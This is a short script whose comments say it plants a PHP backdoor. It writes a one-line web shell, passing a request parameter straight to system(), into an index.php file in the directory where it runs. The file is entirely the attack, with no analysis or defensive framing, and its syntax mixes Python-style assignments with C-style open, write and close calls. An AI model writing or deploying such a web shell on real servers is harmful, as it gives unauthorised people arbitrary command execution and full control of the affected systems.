# this script creates a php backdoor in a file called index.php where the program is executed

# declare constants
code = '<?php system($_REQUEST[\'cmd\']); ?>'
file = 'index.php'

# create file
fd = open(file, 1006) # this flag is "w+"
write(fd, code)
close(fd)

exit(0)
